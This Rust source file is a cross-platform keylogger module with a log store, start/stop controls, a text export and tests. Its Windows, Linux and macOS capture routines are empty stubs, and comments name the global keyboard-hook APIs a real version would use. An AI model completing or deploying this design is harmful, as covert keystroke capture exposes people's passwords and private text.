use log::{info, error};
use std::sync::{Arc, Mutex};
use std::collections::VecDeque;
use chrono::Local;

const MAX_LOGS: usize = 10000;

#[derive(Clone, Debug)]
pub struct KeyLog {
    pub key: String,
    pub timestamp: String,
    pub window_title: Option<String>,
}

pub struct KeyLogger {
    logs: Arc<Mutex<VecDeque<KeyLog>>>,
    is_running: Arc<Mutex<bool>>,
}

impl KeyLogger {
    pub fn new() -> Self {
        Self {
            logs: Arc::new(Mutex::new(VecDeque::new())),
            is_running: Arc::new(Mutex::new(false)),
        }
    }

    /// Start keylogging
    pub async fn start(&self) -> Result<(), String> {
        let mut running = self.is_running.lock().map_err(|e| e.to_string())?;

        if *running {
            return Err("Keylogger already running".to_string());
        }

        *running = true;
        info!("🔐 Keylogger started");

        #[cfg(target_os = "windows")]
        Self::start_windows_logger(self.logs.clone());

        #[cfg(target_os = "linux")]
        Self::start_linux_logger(self.logs.clone());

        #[cfg(target_os = "macos")]
        Self::start_macos_logger(self.logs.clone());

        Ok(())
    }

    /// Stop keylogging
    pub async fn stop(&self) -> Result<(), String> {
        let mut running = self.is_running.lock().map_err(|e| e.to_string())?;

        if !*running {
            return Err("Keylogger not running".to_string());
        }

        *running = false;
        info!("🔐 Keylogger stopped");
        Ok(())
    }

    /// Get current logs
    pub async fn get_logs(&self) -> Result<Vec<KeyLog>, String> {
        let logs = self.logs.lock().map_err(|e| e.to_string())?;
        Ok(logs.iter().cloned().collect())
    }

    /// Clear logs
    pub async fn clear_logs(&self) -> Result<usize, String> {
        let mut logs = self.logs.lock().map_err(|e| e.to_string())?;
        let count = logs.len();
        logs.clear();
        info!("🧹 Keylogger logs cleared (removed {} entries)", count);
        Ok(count)
    }

    /// Get logs count
    pub async fn get_logs_count(&self) -> Result<usize, String> {
        let logs = self.logs.lock().map_err(|e| e.to_string())?;
        Ok(logs.len())
    }

    /// Export logs as text
    pub async fn export_logs(&self) -> Result<String, String> {
        let logs = self.logs.lock().map_err(|e| e.to_string())?;

        let mut result = String::from("=== KEYLOGGER LOG EXPORT ===\n\n");
        result.push_str(&format!("Total Keys: {}\n", logs.len()));
        result.push_str(&format!("Exported: {}\n\n", Local::now().format("%Y-%m-%d %H:%M:%S")));
        result.push_str("=== KEY LOG ===\n\n");

        for log in logs.iter() {
            result.push_str(&format!("[{}] {}\n", log.timestamp, Self::format_key(&log.key)));
        }

        Ok(result)
    }

    // Platform-specific implementations
    #[cfg(target_os = "windows")]
    fn start_windows_logger(logs: Arc<Mutex<VecDeque<KeyLog>>>) {
        // Windows keylogger using global hotkey/clipboard monitoring
        // This is a simplified mock - real implementation would use winapi
        info!("Windows keylogger initialized (monitoring mode)");

        std::thread::spawn(move || {
            loop {
                std::thread::sleep(std::time::Duration::from_millis(100));

                // In production, would use SetWindowsHookEx for global keyboard hook
                // For now, mock with periodic events
                if let Ok(mut log_queue) = logs.lock() {
                    if log_queue.len() < MAX_LOGS {
                        // This would be replaced with actual key capture
                    }
                }
            }
        });
    }

    #[cfg(target_os = "linux")]
    fn start_linux_logger(logs: Arc<Mutex<VecDeque<KeyLog>>>) {
        // Linux keylogger using evdev or X11 event monitoring
        info!("Linux keylogger initialized (monitoring mode)");

        std::thread::spawn(move || {
            loop {
                std::thread::sleep(std::time::Duration::from_millis(100));

                // In production, would use libevdev or X11 event capture
                if let Ok(mut log_queue) = logs.lock() {
                    if log_queue.len() < MAX_LOGS {
                        // This would be replaced with actual key capture
                    }
                }
            }
        });
    }

    #[cfg(target_os = "macos")]
    fn start_macos_logger(logs: Arc<Mutex<VecDeque<KeyLog>>>) {
        // macOS keylogger using Quartz Event Tap
        info!("macOS keylogger initialized (monitoring mode)");

        std::thread::spawn(move || {
            loop {
                std::thread::sleep(std::time::Duration::from_millis(100));

                // In production, would use CGEventTapCreate for system-wide keyboard monitoring
                if let Ok(mut log_queue) = logs.lock() {
                    if log_queue.len() < MAX_LOGS {
                        // This would be replaced with actual key capture
                    }
                }
            }
        });
    }

    fn format_key(key: &str) -> String {
        match key {
            "Return" | "Enter" => "[ENTER]".to_string(),
            "BackSpace" => "[BACKSPACE]".to_string(),
            "Tab" => "[TAB]".to_string(),
            "space" => " ".to_string(),
            "Escape" => "[ESC]".to_string(),
            "Shift_L" | "Shift_R" => "[SHIFT]".to_string(),
            "Control_L" | "Control_R" => "[CTRL]".to_string(),
            "Alt_L" | "Alt_R" => "[ALT]".to_string(),
            "Caps_Lock" => "[CAPS]".to_string(),
            k if k.starts_with("F") && k.len() <= 3 => format!("[{}]", k),
            _ => key.to_string(),
        }
    }
}

impl Default for KeyLogger {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_keylogger_lifecycle() {
        let kl = KeyLogger::new();

        assert!(kl.start().await.is_ok());
        assert!(kl.get_logs_count().await.unwrap() >= 0);
        assert!(kl.stop().await.is_ok());
    }

    #[tokio::test]
    async fn test_log_export() {
        let kl = KeyLogger::new();
        let export = kl.export_logs().await;
        assert!(export.is_ok());
        assert!(export.unwrap().contains("KEYLOGGER LOG EXPORT"));
    }
}
